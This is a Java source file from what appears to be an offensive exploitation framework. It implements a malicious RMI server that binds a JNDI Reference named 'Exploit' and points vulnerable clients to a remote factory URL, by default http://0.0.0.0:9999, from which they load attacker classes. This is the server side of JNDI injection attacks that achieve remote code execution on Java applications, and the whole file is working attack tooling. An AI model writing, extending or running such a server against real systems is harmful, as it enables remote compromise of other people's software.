package com.lucifaer.jokerframework.plugins.server.rmi;

import com.lucifaer.jokerframework.plugins.Server;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.springframework.scheduling.annotation.Async;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.util.Base64;

public abstract class BaseRmiServer implements Server {
//  在rmi中的serverUrl应为空，但是为了符合接口的需求最好还是声明出来
    private String serverUrl;
    private String serverPort;
    private String factoryLocation;
    private Registry registry;
    private Reference reference;
    private ReferenceWrapper referenceWrapper;
    private static boolean firstTime = true;

    private void init() {

        if (serverPort == null || serverPort.isEmpty()) {
            this.serverPort = "2000";
        }

        if (factoryLocation == null || factoryLocation.isEmpty()) {
            this.factoryLocation = "http://0.0.0.0:9999";
        }
    }

//  建立rmi Server时有坑点，以下代码主要参考:
//  * https://knight76.tistory.com/entry/How-to-start-and-shutdown-or-stop-RMI-Server
//  * https://stackoverflow.com/questions/22371487/clean-way-to-stop-rmi-server
    @Async
    public void createServer() {
        init();
        try {
            if (firstTime) {
                registry = LocateRegistry.createRegistry(Integer.parseInt(this.serverPort));
                firstTime = false;
            } else {
                registry = LocateRegistry.getRegistry(Integer.parseInt(this.serverPort));
            }
            referenceWrapper = new ReferenceWrapper(reference);
            registry.rebind("Exploit", referenceWrapper);
        } catch (RemoteException | NamingException e) {
            e.printStackTrace();
        }
    }

    public void stopServer() {
        try {
            Naming.unbind("rmi://127.0.0.1:" + this.serverPort + "/Exploit");
            UnicastRemoteObject.unexportObject(registry, true);
            firstTime = true;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getServerUrl() {
        return serverUrl;
    }

    @Override
    public String getServerPort() {
        return serverPort;
    }

    public void setServerPort(String serverPort) {
        this.serverPort = serverPort;
    }

    public String getFactoryLocation() {
        return factoryLocation;
    }

    public void setFactoryLocation(String factoryLocation) {
        this.factoryLocation = factoryLocation;
    }

    public void setReference(Reference reference) {
        this.reference = reference;
    }
}
